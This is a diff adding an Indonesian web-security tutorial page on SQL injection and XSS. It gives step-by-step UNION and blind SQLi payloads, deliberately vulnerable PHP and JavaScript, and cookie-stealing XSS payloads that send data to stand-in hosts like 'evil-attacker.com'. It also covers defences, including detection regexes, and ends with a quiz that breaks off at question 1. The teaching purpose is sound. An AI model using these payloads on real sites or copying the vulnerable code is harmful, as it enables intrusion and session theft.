@@ -1,0 +1,971 @@
+<!-- ========== SEARCH OVERLAY ========== -->
+  <div class="search-overlay" id="searchOverlay">
+    <button class="search-close-btn" aria-label="Tutup pencarian">&times;</button>
+    <div class="search-box">
+      <div class="search-input-wrapper">
+        <input type="text" id="searchInput" placeholder="Ketik untuk mencari tutorial..." aria-label="Cari tutorial" autocomplete="off">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </div>
+      <div class="search-results" id="searchResults">
+        <div class="search-hint">Ketik untuk mencari</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== READING PROGRESS ========== -->
+  <div style="position:fixed;top:64px;left:0;right:0;height:3px;z-index:999;background:transparent;">
+    <div id="readingProgress" style="height:100%;width:0%;background:linear-gradient(90deg,var(--accent-primary),var(--accent-cyan));transition:width 0.1s linear;border-radius:0 2px 2px 0;"></div>
+  </div>
+
+  <!-- ========== ARTICLE HERO ========== -->
+  <section class="article-hero">
+    <div class="container">
+      <div class="breadcrumb">
+        <a href="../index.html">Beranda</a>
+        <span class="separator">›</span>
+        <a href="../index.html#categories">Keamanan</a>
+        <span class="separator">›</span>
+        <span>SQL Injection &amp; XSS</span>
+      </div>
+
+      <h1>SQL Injection &amp; XSS: Serangan Web yang Umum Terjadi</h1>
+      <span class="access-badge token">TOKEN</span>
+
+      <div class="meta-row">
+        <div class="meta-item">📅 25 Juni 2026</div>
+        <div class="meta-item">📖 14 menit baca</div>
+        <div class="meta-item"><span class="difficulty menengah">Menengah</span></div>
+        <div class="meta-item">🔒 Keamanan Web</div>
+      </div>
+    </div>
+  </section>
+      <div class="article-author">
+        <span class="author-avatar">🐝</span>
+        <div class="author-info">
+          <span class="author-name"><a href="/about.html">Tim BeebaneLabs</a></span>
+          <span class="author-role">Penulis &amp; Kontributor Teknologi</span>
+        </div>
+      </div>
+
+  <!-- ========== AD SLOT ========== -->
+  <div class="container">
+    <div class="ad-slot ad-slot-wide" id="ad-slot-top">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-2122797411859663"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    
+  </div>
+
+  <!-- ========== ARTICLE CONTENT ========== -->
+  <article class="article-content" id="main-content">
+      <!-- TABLE OF CONTENTS -->
+      <div class="info-box info">
+        <div class="info-box-title">📋 Daftar Isi</div>
+        <ol>
+          <li>1. Apa Itu SQL Injection?</li>
+          <li>2. Jenis-Jenis SQL Injection</li>
+          <li>3. Contoh Kode SQL Injection</li>
+          <li>4. Pencegahan SQL Injection</li>
+          <li>5. Apa Itu Cross-Site Scripting (XSS)?</li>
+          <li>6. Jenis-Jenis XSS</li>
+          <li>7. Contoh Kode Serangan XSS</li>
+          <li>8. Pencegahan XSS</li>
+          <li>9. Quiz: Uji Pemahamanmu</li>
+          <li>Quiz Pemahaman</li>
+        </ol>
+      </div>
+
+
+
+    <!-- ====== 1. APA ITU SQL INJECTION ====== -->
+    <h2>1. Apa Itu SQL Injection?</h2>
+
+    <p>
+      SQL Injection (SQLi) adalah teknik serangan keamanan web yang memanfaatkan celah pada
+      lapisan database aplikasi web. Penyerang menyisipkan perintah SQL berbahaya ke dalam
+      input pengguna (seperti form login, URL parameter, atau cookie) yang kemudian dieksekusi
+      oleh database. SQLi telah menempati posisi teratas dalam daftar OWASP Top 10 selama
+      bertahun-tahun karena dampaknya yang sangat destruktif.
+    </p>
+
+    <p>
+      Dengan SQL Injection, penyerang dapat: membaca data sensitif dari database, memodifikasi
+      atau menghapus data, menjalankan operasi administrasi pada database (seperti shutdown),
+      dan dalam beberapa kasus bahkan dapat mengeluarkan perintah ke sistem operasi server.
+    </p>
+
+    <div class="info-box danger">
+      <div class="info-box-title">🚨 Dampak SQL Injection di Dunia Nyata</div>
+      <p>
+        Pada tahun 2008, serangan SQL Injection terhadap situs Heartland Payment Systems
+        berhasil mencuri <strong>130 juta nomor kartu kredit</strong> — menjadikannya salah
+        satu pelanggaran data terbesar dalam sejarah. Pada tahun 2015, British Telecom (BT)
+        juga menjadi korban SQLi yang mengekspos data pelanggan internal.
+      </p>
+    </div>
+
+    <h3>Bagaimana SQL Injection Bekerja?</h3>
+    <p>
+      Aplikasi web yang rentan terhadap SQL Injection biasanya menggabungkan input pengguna
+      secara langsung ke dalam query SQL tanpa sanitasi atau parameterisasi yang tepat.
+      Berikut ilustrasi sederhananya:
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SQL — Contoh Query Rentan</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+-- Query asli yang dibuat oleh aplikasi web
+SELECT * FROM users WHERE username = 'input_pengguna' AND password = 'input_password';
+
+-- Jika penyerang memasukkan: ' OR '1'='1' --
+-- Query menjadi:
+SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'apa_saja';
+
+-- '1'='1' selalu bernilai TRUE, sehingga semua data user dikembalikan
+-- Tanda -- mengomentari sisa query sehingga pengecekan password dilewati
+      </code></pre>
+    </div>
+
+    <!-- ====== 2. JENIS-JENIS SQL INJECTION ====== -->
+    <h2>2. Jenis-Jenis SQL Injection</h2>
+
+    <p>
+      SQL Injection dibagi menjadi beberapa jenis berdasarkan cara penyerang mengekstrak
+      informasi dari database. Memahami setiap jenis sangat penting untuk menerapkan
+      pertahanan yang tepat.
+    </p>
+
+    <table class="spec-table">
+      <thead>
+        <tr>
+          <th>Jenis SQLi</th>
+          <th>Mekanisme</th>
+          <th>Tingkat Kesulitan</th>
+          <th>Dampak</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>In-Band SQLi (Classic)</strong></td>
+          <td>Hasil query dikembalikan langsung di halaman web yang sama. Penyerang melihat output error atau data langsung di browser.</td>
+          <td>Mudah</td>
+          <td>Sangat tinggi — data bisa langsung diekstraksi</td>
+        </tr>
+        <tr>
+          <td><strong>Union-Based SQLi</strong></td>
+          <td>Menggunakan operator UNION SELECT untuk menggabungkan hasil query asli dengan query penyerang, sehingga data dari tabel lain muncul di halaman.</td>
+          <td>Mudah-Sedang</td>
+          <td>Tinggi — bisa membaca tabel apapun</td>
+        </tr>
+        <tr>
+          <td><strong>Error-Based SQLi</strong></td>
+          <td>Memanfaatkan pesan error database untuk mengungkap informasi struktur database, nama tabel, dan isi data.</td>
+          <td>Mudah-Sedang</td>
+          <td>Tinggi — mengekspos metadata database</td>
+        </tr>
+        <tr>
+          <td><strong>Blind SQLi (Boolean-Based)</strong></td>
+          <td>Tidak ada output langsung. Penyerang mengirim query TRUE/FALSE dan mengamati perbedaan respon halaman untuk menyimpulkan data.</td>
+          <td>Sedang</td>
+          <td>Tinggi — data tetap bisa diekstrak per karakter</td>
+        </tr>
+        <tr>
+          <td><strong>Blind SQLi (Time-Based)</strong></td>
+          <td>Penyerang menggunakan fungsi delay (SLEEP/WAITFOR) untuk menentukan apakah kondisi TRUE/FALSE berdasarkan waktu respon server.</td>
+          <td>Sedang-Tinggi</td>
+          <td>Tinggi — sangat lambat tapi efektif</td>
+        </tr>
+        <tr>
+          <td><strong>Out-of-Band SQLi</strong></td>
+          <td>Data diekstrak melalui channel terpisah (DNS request, HTTP request ke server penyerang) menggunakan fungsi seperti xp_cmdshell atau UTL_HTTP.</td>
+          <td>Tinggi</td>
+          <td>Kritis — menembus firewall dan WAF</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- ====== 3. CONTOH SQL INJECTION ====== -->
+    <h2>3. Contoh Kode SQL Injection</h2>
+
+    <p>
+      Berikut adalah beberapa contoh nyata serangan SQL Injection yang umum ditemukan
+      di aplikasi web, beserta kode yang rentan dan cara memperbaikinya.
+    </p>
+
+    <h3>Login Bypass</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">PHP — Login Rentan SQLi</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+&lt;?php
+// ============================================
+// KODE RENTAN — JANGAN digunakan di produksi!
+// ============================================
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// Query dibangun dengan string concatenation — SANGAT BERBAHAYA
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($conn, $query);
+
+if (mysqli_num_rows($result) > 0) {
+    echo "Login berhasil!";
+    // Penyerang bisa bypass login dengan input:
+    // Username: admin' --
+    // Password: apa saja
+}
+?&gt;
+      </code></pre>
+    </div>
+
+    <h3>UNION-Based Data Extraction</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SQL — UNION-Based Attack</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+-- URL target: https://example.com/product?id=1
+
+-- Langkah 1: Tentukan jumlah kolom dengan ORDER BY
+https://example.com/product?id=1 ORDER BY 1--   ← Normal
+https://example.com/product?id=1 ORDER BY 2--   ← Normal
+https://example.com/product?id=1 ORDER BY 3--   ← Normal
+https://example.com/product?id=1 ORDER BY 4--   ← Error! Berarti ada 3 kolom
+
+-- Langkah 2: Temukan kolom yang visible
+https://example.com/product?id=1 UNION SELECT 1,2,3--
+
+-- Langkah 3: Ekstrak nama database
+https://example.com/product?id=1 UNION SELECT 1,database(),3--
+-- Output: "toko_online"
+
+-- Langkah 4: Ekstrak nama tabel
+https://example.com/product?id=1 UNION SELECT 1,group_concat(table_name),3
+    FROM information_schema.tables WHERE table_schema='toko_online'--
+-- Output: "users,products,orders,payments"
+
+-- Langkah 5: Ekstrak kolom dari tabel users
+https://example.com/product?id=1 UNION SELECT 1,group_concat(column_name),3
+    FROM information_schema.columns WHERE table_name='users'--
+-- Output: "id,username,password,email,role"
+
+-- Langkah 6: Ekstrak semua data user (termasuk password!)
+https://example.com/product?id=1 UNION SELECT 1,
+    group_concat(username,0x3a,password SEPARATOR 0x0a),3 FROM users--
+-- Output: admin:5f4dcc3b5aa765d61d8327deb882cf99
+--          user1:e10adc3949ba59abbe56e057f20f883e
+      </code></pre>
+    </div>
+
+    <h3>Time-Based Blind SQLi</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SQL — Time-Based Blind Attack</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+-- Cek apakah target rentan terhadap Blind SQLi
+-- Jika halaman memuat lebih lama 5 detik = rentan
+
+-- MySQL:
+https://example.com/product?id=1 AND SLEEP(5)--
+
+-- PostgreSQL:
+https://example.com/product?id=1; SELECT pg_sleep(5)--
+
+-- SQL Server:
+https://example.com/product?id=1; WAITFOR DELAY '0:0:5'--
+
+-- Ekstrak karakter pertama dari nama database (ASCII-based)
+https://example.com/product?id=1 AND IF(
+    ASCII(SUBSTRING(database(),1,1)) > 100, SLEEP(3), 0
+)--
+-- Jika terlambat 3 detik: karakter pertama > 100 (huruf 't' = 116)
+-- Lanjutkan binary search untuk setiap karakter
+      </code></pre>
+    </div>
+
+    <div class="info-box warning">
+      <div class="info-box-title">⚠️ Peringatan: Etika Pengujian</div>
+      <p>
+        Contoh kode di atas hanya untuk tujuan <strong>edukasi dan pengujian pada sistem
+        yang kamu miliki atau yang memiliki izin tertulis</strong>. Melakukan SQL Injection
+        pada sistem tanpa izin adalah <strong>tindakan ilegal</strong> yang dapat dijerat
+        dengan UU ITE Pasal 30-32 dengan ancaman pidana penjara hingga 10 tahun dan denda
+        miliaran rupiah.
+      </p>
+    </div>
+
+    <!-- ====== 4. PENCEGAHAN SQL INJECTION ====== -->
+    <h2>4. Pencegahan SQL Injection</h2>
+
+    <p>
+      Pencegahan SQL Injection harus dilakukan di beberapa lapisan (defense in depth).
+      Berikut adalah metode-metode pencegahan yang efektif.
+    </p>
+
+    <h3>Prepared Statements (Parameterized Queries)</h3>
+    <p>
+      Prepared statements adalah pertahanan paling efektif melawan SQL Injection karena
+      memisahkan kode SQL dari data secara total. Data yang dimasukkan pengguna tidak
+      pernah diinterpretasikan sebagai perintah SQL.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">PHP — Prepared Statement (Aman)</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+&lt;?php
+// ============================================
+// KODE AMAN — Menggunakan Prepared Statement
+// ============================================
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// Gunakan prepared statement dengan placeholder
+$stmt = $conn->prepare("SELECT id, username, password FROM users WHERE username = ?");
+$stmt->bind_param("s", $username);  // "s" = string type
+$stmt->execute();
+$result = $stmt->get_result();
+
+if ($result->num_rows === 1) {
+    $user = $result->fetch_assoc();
+    // Verifikasi password dengan hash
+    if (password_verify($password, $user['password'])) {
+        echo "Login berhasil! Selamat datang, " . htmlspecialchars($user['username']);
+    }
+}
+$stmt->close();
+?&gt;
+      </code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python — SQLAlchemy ORM (Aman)</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+# ============================================
+# Python — Menggunakan ORM untuk Hindari SQLi
+# ============================================
+
+from sqlalchemy import create_engine, Column, Integer, String
+from sqlalchemy.orm import declarative_base, sessionmaker
+from werkzeug.security import check_password_hash
+
+Base = declarative_base()
+
+class User(Base):
+    __tablename__ = 'users'
+    id = Column(Integer, primary_key=True)
+    username = Column(String(50), unique=True)
+    password = Column(String(200))  # Hashed password
+
+engine = create_engine('mysql+pymysql://user:pass@localhost/toko_online')
+Session = sessionmaker(bind=engine)
+
+def login_user(username: str, password: str) -> bool:
+    """Login dengan ORM — otomatis aman dari SQL Injection."""
+    session = Session()
+    try:
+        # ORM menggunakan prepared statement secara otomatis
+        user = session.query(User).filter(User.username == username).first()
+
+        if user and check_password_hash(user.password, password):
+            return True
+        return False
+    finally:
+        session.close()
+
+# Penggunaan dengan raw SQL (tetap aman)
+from sqlalchemy import text
+
+def get_product(product_id: int):
+    session = Session()
+    # Parameterized query dengan text()
+    result = session.execute(
+        text("SELECT * FROM products WHERE id = :pid"),
+        {"pid": product_id}  # Parameter di-bind secara aman
+    )
+    return result.fetchone()
+      </code></pre>
+    </div>
+
+    <h3>Input Validation &amp; Web Application Firewall (WAF)</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python — Input Validation Middleware</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+# ============================================
+# Input Validation Layer untuk Pencegahan SQLi
+# ============================================
+
+import re
+from functools import wraps
+from flask import Flask, request, abort
+
+app = Flask(__name__)
+
+# Pola berbahaya yang umum digunakan dalam SQLi
+SQLI_PATTERNS = [
+    r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|EXEC|EXECUTE)\b)",
+    r"(--|#|/\*|\*/)",           # SQL comments
+    r"(\bOR\b\s+\b\d+\b\s*=\s*\b\d+\b)",  # OR 1=1
+    r"(\bAND\b\s+\b\d+\b\s*=\s*\b\d+\b)",  # AND 1=1
+    r"(SLEEP\s*\(|BENCHMARK\s*\(|WAITFOR\s+DELAY)",  # Time-based
+    r"(\bINTO\s+(OUTFILE|DUMPFILE)\b)",  # File operations
+    r"(\bLOAD_FILE\s*\(|\bINTO\s+OUTFILE\b)",
+]
+
+def validate_input(value: str) -> bool:
+    """Validasi input terhadap pola SQL Injection."""
+    if not value:
+        return True
+    for pattern in SQLI_PATTERNS:
+        if re.search(pattern, value, re.IGNORECASE):
+            return False
+    return True
+
+def sql_injection_guard(f):
+    """Decorator untuk memvalidasi semua parameter input."""
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        # Validasi query parameters
+        for key, value in request.args.items():
+            if not validate_input(value):
+                abort(400, description=f"Input tidak valid pada parameter '{key}'")
+
+        # Validasi form data
+        if request.form:
+            for key, value in request.form.items():
+                if not validate_input(value):
+                    abort(400, description=f"Input tidak valid pada field '{key}'")
+
+        return f(*args, **kwargs)
+    return decorated
+
+@app.route('/search')
+@sql_injection_guard
+def search_products():
+    """Endpoint pencarian produk dengan SQLi protection."""
+    keyword = request.args.get('q', '')
+    # Tetap gunakan prepared statement meskipun sudah divalidasi
+    # Validasi adalah lapisan pertahanan tambahan (defense in depth)
+    return f"Searching for: {keyword}"
+      </code></pre>
+    </div>
+
+    <div class="info-box tip">
+      <div class="info-box-title">✅ Tips: Defense in Depth untuk SQLi</div>
+      <p>
+        Gunakan semua lapisan pertahanan bersamaan: <strong>1)</strong> Prepared statements
+        sebagai pertahanan utama, <strong>2)</strong> Input validation sebagai lapisan tambahan,
+        <strong>3)</strong> WAF (Web Application Firewall) sebagai pertahanan perimeter,
+        <strong>4)</strong> Principle of least privilege pada database user — jangan berikan
+        akses DROP atau GRANT ke user aplikasi web.
+      </p>
+    </div>
+
+    <!-- ====== 5. APA ITU XSS ====== -->
+    <h2>5. Apa Itu Cross-Site Scripting (XSS)?</h2>
+
+    <p>
+      Cross-Site Scripting (XSS) adalah celah keamanan yang memungkinkan penyerang
+      menyisipkan skrip JavaScript berbahaya ke dalam halaman web yang dilihat oleh pengguna
+      lain. Berbeda dengan SQL Injection yang menyerang server, XSS menyerang
+      <strong>browser pengguna</strong> — menjadikannya serangan sisi klien (client-side).
+    </p>
+
+    <p>
+      Ketika XSS berhasil dieksekusi, penyerang dapat: mencuri cookie dan session token
+      pengguna, mengalihkan pengguna ke situs phishing, menampilkan halaman palsu (deface),
+      menginstal keylogger di browser, dan bahkan mengendalikan akun pengguna.
+    </p>
+
+    <div class="arch-diagram">
+      <div class="arch-title">📊 Alur Serangan XSS</div>
+      <div class="flow-container">
+        <div class="flow-step">
+          <div class="flow-number">1</div>
+          <div class="flow-content">
+            <div class="flow-icon">😈</div>
+            <div class="flow-label">Penyerang</div>
+            <div class="flow-desc">Menyisipkan script</div>
+          </div>
+        </div>
+        <div class="flow-connector">→</div>
+        <div class="flow-step">
+          <div class="flow-number">2</div>
+          <div class="flow-content">
+            <div class="flow-icon">🖥️</div>
+            <div class="flow-label">Server Web</div>
+            <div class="flow-desc">Menyimpan script</div>
+          </div>
+        </div>
+        <div class="flow-connector">→</div>
+        <div class="flow-step">
+          <div class="flow-number">3</div>
+          <div class="flow-content">
+            <div class="flow-icon">👤</div>
+            <div class="flow-label">Korban</div>
+            <div class="flow-desc">Mengunjungi halaman</div>
+          </div>
+        </div>
+        <div class="flow-connector">→</div>
+        <div class="flow-step">
+          <div class="flow-number">4</div>
+          <div class="flow-content">
+            <div class="flow-icon">💀</div>
+            <div class="flow-label">Eksekusi</div>
+            <div class="flow-desc">Script berjalan di browser korban</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ====== 6. JENIS-JENIS XSS ====== -->
+    <h2>6. Jenis-Jenis XSS</h2>
+
+    <table class="spec-table">
+      <thead>
+        <tr>
+          <th>Jenis XSS</th>
+          <th>Mekanisme</th>
+          <th>Persistensi</th>
+          <th>Contoh Kasus</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>Stored XSS (Persistent)</strong></td>
+          <td>Script berbahaya disimpan permanen di database/server (komentar, postingan, profil user). Setiap pengunjung halaman tersebut akan terkena.</td>
+          <td>Permanen</td>
+          <td>Komentar forum yang berisi script pencuri cookie</td>
+        </tr>
+        <tr>
+          <td><strong>Reflected XSS (Non-Persistent)</strong></td>
+          <td>Script berbahaya dimasukkan melalui URL parameter atau form input yang langsung direfleksikan ke halaman tanpa sanitasi. Korban harus mengklik link khusus.</td>
+          <td>Sementara</td>
+          <td>Link phishing: example.com/search?q=&lt;script&gt;...&lt;/script&gt;</td>
+        </tr>
+        <tr>
+          <td><strong>DOM-Based XSS</strong></td>
+          <td>Script berbahaya dieksekusi melalui manipulasi DOM (Document Object Model) di sisi client. Server tidak terlibat — semua terjadi di browser korban.</td>
+          <td>Sementara</td>
+          <td>Manipulasi fragment URL (#) yang diproses oleh JavaScript client-side</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- ====== 7. CONTOH XSS ====== -->
+    <h2>7. Contoh Kode Serangan XSS</h2>
+
+    <h3>Stored XSS pada Form Komentar</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">HTML/JavaScript — Stored XSS Attack</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+&lt;!-- ============================================ --&gt;
+&lt;!-- Form Komentar yang Rentan terhadap Stored XSS --&gt;
+&lt;!-- ============================================ --&gt;
+
+&lt;!-- KODE RENTAN (server tidak sanitize input) --&gt;
+&lt;form action="/submit-comment" method="POST"&gt;
+    &lt;textarea name="comment"&gt;&lt;/textarea&gt;
+    &lt;button type="submit"&gt;Kirim Komentar&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;!-- Penyerang mengisi komentar dengan: --&gt;
+&lt;script&gt;
+    // Curi cookie session pengguna
+    var stolenData = {
+        cookie: document.cookie,
+        url: window.location.href,
+        userAgent: navigator.userAgent
+    };
+    // Kirim ke server penyerang
+    fetch('https://evil-attacker.com/collect', {
+        method: 'POST',
+        body: JSON.stringify(stolenData),
+        headers: {'Content-Type': 'application/json'}
+    });
+&lt;/script&gt;
+
+&lt;!-- Payload yang lebih halus (menggunakan img tag): --&gt;
+&lt;img src=x onerror="
+    fetch('https://evil-attacker.com/steal?c='+document.cookie)
+"&gt;
+
+&lt;!-- Payload menggunakan SVG: --&gt;
+&lt;svg onload="alert(document.cookie)"&gt;
+      </code></pre>
+    </div>
+
+    <h3>Reflected XSS pada URL Parameter</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">URL — Reflected XSS Attack</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+# ============================================
+# Reflected XSS — Melalui URL Parameter
+# ============================================
+
+# Target halaman search yang menampilkan query tanpa sanitasi
+# Server merender: "Hasil pencarian untuk: [query_pengguna]"
+
+# Payload sederhana:
+https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# Payload yang lebih berbahaya (menggunakan encoded URL):
+https://example.com/search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
+
+# Payload menggunakan event handler:
+https://example.com/search?q="&gt;&lt;img src=x onerror="alert(document.cookie)"&gt;
+
+# Penyerang kemudian menyebarkan link tersebut via email phishing:
+# "Klik di sini untuk melihat promo spesial: [link XSS]"
+      </code></pre>
+    </div>
+
+    <h3>DOM-Based XSS</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JavaScript — DOM-Based XSS</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+// ============================================
+// DOM-Based XSS — Semua terjadi di client
+// ============================================
+
+// Kode JavaScript yang rentan di halaman web:
+// Halaman mengambil parameter dari URL dan menampilkan tanpa sanitasi
+
+// URL berbahaya:
+// https://example.com/welcome#&lt;img src=x onerror=alert(document.cookie)&gt;
+
+// Kode rentan di halaman:
+const hash = window.location.hash.substring(1); // Ambil setelah #
+document.getElementById('welcome').innerHTML = 'Selamat datang, ' + hash;
+// innerHTML mengeksekusi script yang disisipkan!
+
+// ============================================
+// Contoh DOM XSS pada framework populer
+// ============================================
+
+// VULNERABLE: Menggunakan innerHTML
+document.getElementById('output').innerHTML = userInput;
+
+// VULNERABLE: Menggunakan eval()
+eval(userInput);
+
+// VULNERABLE: Menggunakan document.write()
+document.write('&lt;p&gt;' + userInput + '&lt;/p&gt;');
+
+// VULNERABLE: jQuery .html() dengan user input
+$('#output').html(userInput);
+      </code></pre>
+    </div>
+
+    <!-- ====== 8. PENCEGAHAN XSS ====== -->
+    <h2>8. Pencegahan XSS</h2>
+
+    <h3>Output Encoding</h3>
+    <p>
+      Output encoding adalah pertahanan utama melawan XSS. Semua data yang berasal dari
+      pengguna harus di-encode sebelum dirender di halaman HTML. Karakter khusus seperti
+      <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, dan
+      <code>'</code> diubah menjadi entitas HTML yang aman.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">PHP — Output Encoding</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+&lt;?php
+// ============================================
+// Pencegahan XSS dengan Output Encoding
+// ============================================
+
+// JANGAN GUNAKAN INI (rentan):
+// echo "Selamat datang, " . $_GET['name'];
+
+// GUNAKAN INI (aman) — htmlspecialchars untuk konteks HTML:
+function safe_html(string $input): string {
+    return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+}
+
+// Penggunaan:
+$name = $_GET['name'] ?? 'Tamu';
+echo '&lt;p&gt;Selamat datang, ' . safe_html($name) . '&lt;/p&gt;';
+
+// Input: &lt;script&gt;alert('XSS')&lt;/script&gt;
+// Output: &amp;lt;script&amp;gt;alert(&amp;#039;XSS&amp;#039;)&amp;lt;/script&amp;gt;
+// Aman — script tidak akan dieksekusi
+
+// Encoding untuk konteks JavaScript:
+function safe_js(string $input): string {
+    return json_encode($input, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
+}
+
+// Encoding untuk konteks URL:
+function safe_url(string $input): string {
+    return rawurlencode($input);
+}
+
+// Encoding untuk konteks CSS:
+function safe_css(string $input): string {
+    return preg_replace('/[^a-zA-Z0-9\s]/', '', $input);
+}
+?&gt;
+      </code></pre>
+    </div>
+
+    <h3>Content Security Policy (CSP)</h3>
+    <p>
+      Content Security Policy (CSP) adalah mekanisme keamanan yang ditambahkan melalui
+      HTTP header yang membatasi sumber resource yang boleh dimuat oleh browser. CSP
+      merupakan pertahanan yang sangat kuat melawan XSS karena dapat memblokir eksekusi
+      script inline dan script dari domain yang tidak tepercaya.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Nginx — Content Security Policy</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+# ============================================
+# Content Security Policy (CSP) Configuration
+# Untuk Nginx Web Server
+# ============================================
+
+server {
+    listen 443 ssl http2;
+    server_name example.com;
+
+    # CSP Header yang ketat
+    add_header Content-Security-Policy "
+        default-src 'self';
+        script-src 'self' https://cdn.jsdelivr.net;
+        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+        img-src 'self' data: https:;
+        font-src 'self' https://fonts.gstatic.com;
+        connect-src 'self' https://api.example.com;
+        frame-ancestors 'none';
+        base-uri 'self';
+        form-action 'self';
+        upgrade-insecure-requests;
+    " always;
+
+    # Header keamanan tambahan
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "DENY" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
+}
+      </code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python/Flask — CSP Middleware</span>
+        <button class="code-copy">📋 Copy</button>
+      </div>
+      <pre><code>
+# ============================================
+# CSP Middleware untuk Flask Application
+# ============================================
+
+from flask import Flask, make_response
+from functools import wraps
+
+app = Flask(__name__)
+
+# CSP Policy yang ketat
+CSP_POLICY = {
+    'default-src': "'self'",
+    'script-src': "'self' 'nonce-{nonce}'",
+    'style-src': "'self' 'unsafe-inline'",
+    'img-src': "'self' data: https:",
+    'font-src': "'self'",
+    'connect-src': "'self'",
+    'frame-ancestors': "'none'",
+    'base-uri': "'self'",
+    'form-action': "'self'",
+}
+
+def generate_nonce():
+    """Generate CSP nonce yang unik per request."""
+    import secrets
+    return secrets.token_urlsafe(32)
+
+def csp_protected(f):
+    """Decorator untuk menambahkan CSP header ke setiap response."""
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        nonce = generate_nonce()
+        csp_header = '; '.join(
+            f"{key} {value.format(nonce=nonce)}" for key, value in CSP_POLICY.items()
+        )
+
+        response = make_response(f(*args, **kwargs))
+        response.headers['Content-Security-Policy'] = csp_header
+        response.headers['X-Content-Type-Options'] = 'nosniff'
+        response.headers['X-Frame-Options'] = 'DENY'
+
+        return response
+    return decorated
+
+@app.route('/')
+@csp_protected
+def index():
+    return '&lt;h1&gt;Aplikasi Aman dengan CSP&lt;/h1&gt;'
+      </code></pre>
+    </div>
+
+    <div class="info-box info">
+      <div class="info-box-title">💡 Perbandingan Pertahanan SQLi vs XSS</div>
+      <p>
+        <strong>SQL Injection</strong> dicegah terutama dengan prepared statements dan
+        input validation. <strong>XSS</strong> dicegah dengan output encoding dan Content
+        Security Policy. Keduanya membutuhkan <strong>defense in depth</strong> — jangan
+        hanya mengandalkan satu metode. WAF (Web Application Firewall) seperti ModSecurity
+        atau Cloudflare WAF dapat menjadi lapisan pertahanan tambahan untuk keduanya.
+      </p>
+    </div>
+
+    <!-- ====== 9. QUIZ ====== -->
+    <h2>9. Quiz: Uji Pemahamanmu</h2>
+
+    <p>
+      Jawab pertanyaan berikut untuk menguji pemahaman kamu tentang SQL Injection dan XSS.
+      Pilih satu jawaban terbaik untuk setiap pertanyaan.
+    </p>
+
+    <div class="quiz-container" id="quiz06">
+      <h3>📝 Quiz SQL Injection &amp; XSS</h3>
+
+      <!-- Q1 -->
+      <div class="quiz-question">
+        <h4>1. Apa metode paling efektif untuk mencegah SQL Injection?</h4>
+        <button class="quiz-option" data-question="0" data-answer="a">a. Prepared statements (parameterized queries)</button>
+        <button class="quiz-option" data-question="0" data-answer="b">b. Menambahkan firewall di depan server</button>
+        <button class="quiz-option" data-question="0" data-answer="c">c. Menggunakan password yang kuat untuk database</button>
